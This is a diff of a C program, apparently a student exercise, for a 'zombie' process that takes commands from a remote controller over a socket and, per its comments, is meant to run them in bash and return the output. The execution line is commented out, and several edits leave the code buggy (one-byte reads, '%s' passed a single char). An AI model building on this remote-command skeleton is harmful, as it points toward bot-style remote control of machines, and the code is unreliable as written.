@@ -36,7 +36,7 @@ void EndZombieHandler(int num){
 
 void programme_inoffensif(void* adrr, void* portt, void* newsockfdd) {
     int* newsockfd = newsockfdd;
-    char* commande;
+    char commande[256];
     char* response;
     printf("Début du programme inoffensif\n");
     /*FILE *fp = popen("/bin/bash", "r"); // Ouvrir un terminal bash
@@ -49,7 +49,7 @@ void programme_inoffensif(void* adrr, void* portt, void* newsockfdd) {
     while(end!=1){
         // lis ce que lui envoie le controller
         sread(*newsockfd, &commande, sizeof(char));
-
+        printf("Commande reçue : %s\n", commande);
         if(strcmp(commande, "stop") == 0){
             end = 1;
             printf("Fin du programme inoffensif\n");
@@ -57,7 +57,7 @@ void programme_inoffensif(void* adrr, void* portt, void* newsockfdd) {
             // execute la commande dans le terminal
             printf("Execution de la commande\n");
             /*response = fprintf(fp, "%s", commande);*/
-            /*response = */fprintf(stdout, "%s", commande);
+            /*response = */fprintf(stdout, "%s", *commande);
             // renvoie le resultat de la commande au controller
             swrite(*newsockfd, &response, sizeof(char));
         }
@@ -80,10 +80,10 @@ int main(int argc, char *argv[]){
     int newsockfd = saccept(sockfd);
     printf("Connexion établie\n");
 
-    char* adr;
+    char adr [256];
     sread(newsockfd, &adr, sizeof(char));
 
-    printf("Adresse du controller : %s\n", adr);
+    printf("Adresse du controller : %s\n", *adr);
 
     int pid_zombie = fork_and_run3(programme_inoffensif, &adr, &port, &newsockfd);
 
